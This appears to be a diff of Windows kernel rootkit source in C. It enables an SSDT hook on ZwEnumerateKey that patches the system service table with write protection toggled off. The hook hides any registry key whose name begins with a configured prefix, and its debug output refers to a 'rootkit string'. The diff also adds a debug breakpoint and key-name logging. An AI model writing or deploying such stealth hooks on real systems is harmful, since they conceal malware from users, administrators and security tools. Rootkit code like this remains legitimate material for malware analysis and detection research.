@@ -46,9 +46,10 @@ VOID HookApis()
 
 //        OldZwOpenKey = SYSTEMSERVICE(ZwOpenKey);
 //        SYSTEMSERVICE( ZwOpenKey ) = HookZwOpenKey; 
-        
-//        OldNtEnumerateKey = SYSTEMSERVICE(ZwEnumerateKey);
-//        SYSTEMSERVICE( ZwEnumerateKey ) = HookNtEnumerateKey; 
+
+        OldNtEnumerateKey = SYSTEMSERVICE(ZwEnumerateKey);
+        __asm int 3
+        SYSTEMSERVICE( ZwEnumerateKey ) = HookNtEnumerateKey; 
 
 		bHooked = TRUE;
 		WPON();
@@ -75,7 +76,7 @@ VOID UnHookApis()
 		SYSCALL( currentAPI.NtQueryDirectoryFileIndex ) = OldNtQueryDirectoryFile;	
 		
 //        SYSTEMSERVICE( ZwOpenKey ) = OldZwOpenKey;
-//        SYSTEMSERVICE( ZwEnumerateKey ) = OldNtEnumerateKey;        
+        SYSTEMSERVICE( ZwEnumerateKey ) = OldNtEnumerateKey;        
 
 		bHooked = FALSE;
 		WPON();
@@ -95,8 +96,22 @@ NTSTATUS
     )
 {
   NTSTATUS rc;
-  
-  DbgPrint("ZwEnumerateKey");
+  WCHAR *key = NULL;
+  ULONG keyLen = 0;
+  PVOID Object;
+  char KeyName[1024];
+  rc=ObReferenceObjectByHandle( KeyHandle, 0, 0, KernelMode, &Object, NULL);
+  if (rc==STATUS_SUCCESS) {
+//     extern NTSTATUS ObQueryNameString(void *, void *, int size, int *);
+     int BytesReturned;
+     rc=ObQueryNameString( Object,
+                           (PUNICODE_STRING)KeyName,
+                           1024,
+                           &BytesReturned);
+                           
+     ObDereferenceObject(Object);
+     DbgPrint("KeyName = %S\n",KeyName);
+  }    
   
   rc = OldNtEnumerateKey(
        KeyHandle,
@@ -105,8 +120,33 @@ NTSTATUS
        KeyInformation,
        Length,
        ResultLength
-    );
+       );
+
+  key = ((KEY_BASIC_INFORMATION *)KeyInformation)->Name;
+  keyLen = ((KEY_BASIC_INFORMATION *)KeyInformation)->NameLength;
+  DbgPrint( "Key = %S (%ld)\n", key, keyLen );
+  
+//  (PVOID)&hidePrefixW.Buffer[ 0 ]
     
+  if (keyLen >= hidePrefixW.Length ) 
+     if (RtlCompareMemory( key, (PVOID)&hidePrefixW.Buffer[0] , hidePrefixW.Length) == hidePrefixW.Length ) 
+//     if( !wcsncmp( key,
+//		           (const wchar_t*)&hidePrefixW.Buffer[0],
+//				   wcslen( hidePrefixW ) )
+     {
+           DbgPrint("Detected rootkit string!\n");
+           rc = OldNtEnumerateKey(
+                KeyHandle,
+                Index-1,
+                KeyInformationClass,
+                KeyInformation,
+                Length,
+                ResultLength
+                );
+           return rc;
+     }
+
+//  DbgPrint("ZwEnumerateKey\n");    
      
   return rc;   
 }
